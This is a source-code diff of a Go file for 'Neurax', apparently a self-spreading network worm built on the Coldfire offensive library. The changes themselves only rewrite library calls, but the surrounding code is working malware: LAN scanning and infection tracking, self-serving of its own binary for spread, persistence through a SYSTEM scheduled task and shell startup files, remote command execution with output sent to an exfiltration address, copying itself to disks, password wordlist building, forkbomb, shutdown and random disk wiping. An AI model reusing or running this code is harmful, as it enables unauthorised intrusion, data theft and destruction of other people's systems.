@@ -20,7 +20,7 @@ import (
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"github.com/mostlygeek/arp"
-	coldfire "github.com/redcode-labs/Coldfire"
+	. "github.com/redcode-labs/Coldfire"
 	"github.com/yelinaung/go-haikunator"
 )
 
@@ -114,11 +114,11 @@ var NeuraxConfig = __NeuraxConfig{
 	CommPort:           7777,
 	CommProto:          "udp",
 	ScanRequiredPort:   0,
-	LocalIp:            coldfire.GetLocalIp(),
+	LocalIp:            GetLocalIp(),
 	Path:               "random",
 	FileName:           "random",
 	Platform:           runtime.GOOS,
-	Cidr:               coldfire.GetLocalIp() + "/24",
+	Cidr:               GetLocalIp() + "/24",
 	ScanPassive:        false,
 	ScanActiveTimeout:  2,
 	ScanPassiveTimeout: 50,
@@ -189,7 +189,7 @@ func NeuraxStager() string {
 		}
 	}
 	if NeuraxConfig.Stager == "random" {
-		stager = coldfire.RandomSelectStrNested(stagers)
+		stager = RandomSelectStrNested(stagers)
 	} else {
 		for s := range stagers {
 			st := stagers[s]
@@ -212,7 +212,7 @@ func NeuraxStager() string {
 		selected_stager_command = strings.Join(chained_commands, " "+separator+" ")
 	}
 	if NeuraxConfig.Path == "random" {
-		NeuraxConfig.Path = coldfire.RandomSelectStr(paths)
+		NeuraxConfig.Path = RandomSelectStr(paths)
 	}
 	if NeuraxConfig.FileName == "random" && NeuraxConfig.Platform == "windows" {
 		NeuraxConfig.FileName += ".exe"
@@ -237,7 +237,7 @@ func NeuraxServer() {
 	}*/
 	data, _ := ioutil.ReadFile(os.Args[0])
 	if NeuraxConfig.Base64 {
-		data = []byte(coldfire.B64E(string(data)))
+		data = []byte(B64E(string(data)))
 	}
 	addr := fmt.Sprintf(":%d", NeuraxConfig.Port)
 	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
@@ -247,7 +247,7 @@ func NeuraxServer() {
 
 //Returns true if host is active
 func IsHostActive(target string) bool {
-	if coldfire.Contains(NeuraxConfig.Blacklist, target) {
+	if Contains(NeuraxConfig.Blacklist, target) {
 		return false
 	}
 	first := 19
@@ -267,7 +267,7 @@ func IsHostActive(target string) bool {
 		if NeuraxConfig.ScanRequiredPort == 0 {
 			return true
 		} else {
-			if coldfire.PortscanSingle(target, NeuraxConfig.ScanRequiredPort) {
+			if PortscanSingle(target, NeuraxConfig.ScanRequiredPort) {
 				return true
 			}
 		}
@@ -277,10 +277,10 @@ func IsHostActive(target string) bool {
 
 //Returns true if host is infected
 func IsHostInfected(target string) bool {
-	if coldfire.Contains(NeuraxConfig.Blacklist, target) {
+	if Contains(NeuraxConfig.Blacklist, target) {
 		return false
 	}
-	if coldfire.Contains(InfectedHosts, target) {
+	if Contains(InfectedHosts, target) {
 		return true
 	}
 	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.Port)
@@ -290,7 +290,7 @@ func IsHostInfected(target string) bool {
 	}
 	if rsp.StatusCode == 200 {
 		InfectedHosts = append(InfectedHosts, target)
-		InfectedHosts = coldfire.RemoveFromSlice(InfectedHosts, coldfire.GetLocalIp())
+		InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
 		return true
 	}
 	return false
@@ -315,29 +315,29 @@ func NeuraxSignal(addr string) {
 
 func add_persistent_command(cmd string) {
 	if runtime.GOOS == "windows" {
-		coldfire.CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
+		CmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
 	} else {
-		coldfire.CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
+		CmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
 	}
 }
 
 func handle_command(cmd string) {
 	if NeuraxConfig.PreventReexec {
-		if coldfire.Contains(ReceivedCommands, cmd) {
+		if Contains(ReceivedCommands, cmd) {
 			return
 		}
 		ReceivedCommands = append(ReceivedCommands, cmd)
 	}
-	DataSender := coldfire.SendDataUDP
+	DataSender := SendDataUDP
 	forwarded_preamble := ""
 	if NeuraxConfig.CommProto == "tcp" {
-		DataSender = coldfire.SendDataTCP
+		DataSender = SendDataTCP
 	}
 	preamble := strings.Fields(cmd)[0]
 	can_execute := true
 	no_forward := false
 	if strings.Contains(preamble, "e") {
-		if !coldfire.IsRoot() {
+		if !IsRoot() {
 			can_execute = false
 		}
 	}
@@ -347,13 +347,13 @@ func handle_command(cmd string) {
 	if strings.Contains(preamble, ":") {
 		cmd = strings.Join(strings.Fields(cmd)[1:], " ")
 		if strings.Contains(preamble, "s") {
-			time.Sleep(time.Duration(coldfire.RandomInt(1, 5)))
+			time.Sleep(time.Duration(RandomInt(1, 5)))
 		}
 		if strings.Contains(preamble, "p") {
 			add_persistent_command(cmd)
 		}
 		if strings.Contains(preamble, "x") && can_execute {
-			out, err := coldfire.CmdOut(cmd)
+			out, err := CmdOut(cmd)
 			if err != nil {
 				if strings.Contains(preamble, "!") {
 					no_forward = true
@@ -367,11 +367,11 @@ func handle_command(cmd string) {
 				host := strings.Split(NeuraxConfig.ExfilAddr, ":")[0]
 				port := strings.Split(NeuraxConfig.ExfilAddr, ":")[1]
 				p, _ := strconv.Atoi(port)
-				coldfire.SendDataTCP(host, p, out)
+				SendDataTCP(host, p, out)
 			}
 			if strings.Contains(preamble, "l") && can_execute {
 				for {
-					coldfire.CmdRun(cmd)
+					CmdRun(cmd)
 				}
 			}
 		}
@@ -386,20 +386,20 @@ func handle_command(cmd string) {
 			}
 		}
 		if strings.Contains(preamble, "r") {
-			coldfire.Remove()
+			Remove()
 			os.Exit(0)
 		}
 		if strings.Contains(preamble, "q") {
-			coldfire.Shutdown()
+			Shutdown()
 		}
 		if strings.Contains(preamble, "f") {
-			coldfire.Forkbomb()
+			Forkbomb()
 		}
 	} else {
 		if cmd == "purge" {
 			NeuraxPurgeSelf()
 		}
-		coldfire.CmdOut(cmd)
+		CmdOut(cmd)
 	}
 }
 
@@ -448,10 +448,10 @@ func neurax_scan_passive_single_iface(c chan string, iface string) {
 			ip, _ := ip_layer.(*layers.IPv4)
 			source := fmt.Sprintf("%s", ip.SrcIP)
 			destination := fmt.Sprintf("%s", ip.DstIP)
-			if source != coldfire.GetLocalIp() && !IsHostInfected(source) {
+			if source != GetLocalIp() && !IsHostInfected(source) {
 				c <- source
 			}
-			if destination != coldfire.GetLocalIp() && !IsHostInfected(destination) {
+			if destination != GetLocalIp() && !IsHostInfected(destination) {
 				c <- destination
 			}
 		}
@@ -459,7 +459,7 @@ func neurax_scan_passive_single_iface(c chan string, iface string) {
 }
 
 func neurax_scan_passive(c chan string) {
-	current_iface, _ := coldfire.Iface()
+	current_iface, _ := Iface()
 	ifaces_to_use := []string{current_iface}
 	device_names := []string{}
 	devices, err := pcap.FindAllDevs()
@@ -484,13 +484,13 @@ func neurax_scan_active(c chan string) {
 			}
 		}
 	}
-	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.Cidr)
+	full_addr_range, _ := ExpandCidr(NeuraxConfig.Cidr)
 	for _, addr := range full_addr_range {
-		if !coldfire.Contains(NeuraxConfig.Blacklist, addr) {
+		if !Contains(NeuraxConfig.Blacklist, addr) {
 			targets = append(targets, addr)
 		}
 	}
-	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
+	targets = RemoveFromSlice(targets, GetLocalIp())
 	if len(NeuraxConfig.ScanFirst) != 0 {
 		targets = append(NeuraxConfig.ScanFirst, targets...)
 	}
@@ -515,14 +515,14 @@ func neurax_scan_core(c chan string) {
 func NeuraxScan(c chan string) {
 	for {
 		neurax_scan_core(c)
-		time.Sleep(time.Duration(coldfire.IntervalToSeconds(NeuraxConfig.ScanInterval)))
+		time.Sleep(time.Duration(IntervalToSeconds(NeuraxConfig.ScanInterval)))
 	}
 }
 
 func NeuraxScanInfected(c chan string) {
-	full_addr_range, _ := coldfire.ExpandCidr(NeuraxConfig.Cidr)
+	full_addr_range, _ := ExpandCidr(NeuraxConfig.Cidr)
 	for _, addr := range full_addr_range {
-		if !coldfire.Contains(NeuraxConfig.Blacklist, addr) {
+		if !Contains(NeuraxConfig.Blacklist, addr) {
 			if IsHostInfected(addr) {
 				c <- addr
 			}
@@ -536,12 +536,12 @@ func NeuraxDisks() error {
 	if runtime.GOOS == "windows" {
 		selected_name += ".exe"
 	}
-	disks, err := coldfire.Disks()
+	disks, err := Disks()
 	if err != nil {
 		return err
 	}
 	for _, d := range disks {
-		err := coldfire.CopyFile(os.Args[0], d+"/"+selected_name)
+		err := CopyFile(os.Args[0], d+"/"+selected_name)
 		if err != nil {
 			return err
 		}
@@ -553,7 +553,7 @@ func NeuraxDisks() error {
 func NeuraxZIP(num_files int) error {
 	archive_name := gen_haiku() + ".zip"
 	files_to_zip := []string{os.Args[0]}
-	files, err := coldfire.CurrentDirFiles()
+	files, err := CurrentDirFiles()
 	if err != nil {
 		return err
 	}
@@ -563,14 +563,14 @@ func NeuraxZIP(num_files int) error {
 		files[index] = files[len(files)-1]
 		files = files[:len(files)-1]
 	}
-	return coldfire.MakeZip(archive_name, files_to_zip)
+	return MakeZip(archive_name, files_to_zip)
 }
 
 //The binary zips itself and saves under save name in archive
 func NeuraxZIPSelf() error {
 	archive_name := os.Args[0] + ".zip"
 	files_to_zip := []string{os.Args[0]}
-	return coldfire.MakeZip(archive_name, files_to_zip)
+	return MakeZip(archive_name, files_to_zip)
 }
 
 func gen_haiku() string {
@@ -580,9 +580,9 @@ func gen_haiku() string {
 
 //Removes binary from all nodes that can be reached
 func NeuraxPurge() {
-	DataSender := coldfire.SendDataUDP
+	DataSender := SendDataUDP
 	if NeuraxConfig.CommProto == "tcp" {
-		DataSender = coldfire.SendDataTCP
+		DataSender = SendDataTCP
 	}
 	for _, host := range InfectedHosts {
 		err := DataSender(host, NeuraxConfig.CommPort, "purge")
@@ -667,12 +667,12 @@ func WordLeet(word string) []string {
 }
 
 func WordRevert(word string) []string {
-	return []string{coldfire.Revert(word)}
+	return []string{Revert(word)}
 }
 
 func RussianRoulette() error {
-	if coldfire.RandomInt(1, 6) == 6 {
-		return coldfire.Wipe()
+	if RandomInt(1, 6) == 6 {
+		return Wipe()
 	}
 	return nil
 }
@@ -696,19 +696,19 @@ func NeuraxWordlist(words ...string) []string {
 		wordlist = append(wordlist, word+"12")
 		wordlist = append(wordlist, word+"123")
 		if NeuraxConfig.WordlistExpand {
-			if coldfire.Contains(NeuraxConfig.WordlistMutators, "encapsule") {
+			if Contains(NeuraxConfig.WordlistMutators, "encapsule") {
 				wordlist = append(wordlist, WordEncapsule(word)...)
 			}
-			if coldfire.Contains(NeuraxConfig.WordlistMutators, "cyryllic") {
+			if Contains(NeuraxConfig.WordlistMutators, "cyryllic") {
 				wordlist = append(wordlist, WordCyryllicReplace(word)...)
 			}
-			if coldfire.Contains(NeuraxConfig.WordlistMutators, "single_upper") {
+			if Contains(NeuraxConfig.WordlistMutators, "single_upper") {
 				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
 			}
-			if coldfire.Contains(NeuraxConfig.WordlistMutators, "leet") {
+			if Contains(NeuraxConfig.WordlistMutators, "leet") {
 				wordlist = append(wordlist, WordLeet(word)...)
 			}
-			if coldfire.Contains(NeuraxConfig.WordlistMutators, "revert") {
+			if Contains(NeuraxConfig.WordlistMutators, "revert") {
 				wordlist = append(wordlist, WordRevert(word)...)
 			}
 		}
@@ -721,7 +721,7 @@ func NeuraxSetTTL(interval string) {
 	for {
 		time.Sleep(time.Duration(10))
 		passed := time.Since(first_exec).Seconds()
-		if int(passed) > coldfire.IntervalToSeconds(interval) {
+		if int(passed) > IntervalToSeconds(interval) {
 			NeuraxPurgeSelf()
 		}
 	}
@@ -732,14 +732,14 @@ func NeuraxMigrate(path string) error {
 	if strings.Contains(current_path, path) {
 		return nil
 	}
-	return coldfire.CopyFile(os.Args[0], path)
+	return CopyFile(os.Args[0], path)
 }
 
 func NeuraxAlloc() {
-	min_alloc := coldfire.SizeToBytes("10m")
-	max_alloc := coldfire.SizeToBytes("600m")
+	min_alloc := SizeToBytes("10m")
+	max_alloc := SizeToBytes("600m")
 	for n := 0; n < NeuraxConfig.AllocNum; n++ {
-		num_bytes := coldfire.RandomInt(min_alloc, max_alloc)
+		num_bytes := RandomInt(min_alloc, max_alloc)
 		_ = make([]byte, num_bytes)
 	}
 }
